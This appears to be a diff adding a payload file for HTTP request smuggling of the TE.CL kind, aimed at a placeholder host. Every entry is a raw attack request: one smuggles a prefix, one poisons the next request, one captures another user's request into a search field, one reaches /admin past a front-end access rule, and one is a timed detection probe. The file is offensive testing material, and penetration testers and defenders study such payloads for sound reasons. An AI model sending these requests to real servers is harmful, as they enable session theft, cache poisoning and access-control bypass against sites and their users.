@@ -1,0 +1,68 @@
+# ============================================================
+# Request Smuggling — TE.CL (Frontend: Transfer-Encoding, Backend: Content-Length)
+# ============================================================
+
+# ---- Basic TE.CL ----
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+
+# ---- TE.CL — Poison Next Request ----
+POST / HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+Transfer-Encoding: chunked
+
+1c
+q=smuggled&content-length=4
+0
+
+
+# ---- TE.CL — Capture Next Request ----
+POST / HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3
+Transfer-Encoding: chunked
+
+81
+POST / HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+
+search=
+0
+
+
+# ---- TE.CL — Bypass Front-End ACL ----
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+3c
+GET /admin HTTP/1.1
+Host: localhost
+Content-Length: 5
+
+x=1
+0
+
+
+# ---- TE.CL — Detection (timed) ----
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+X
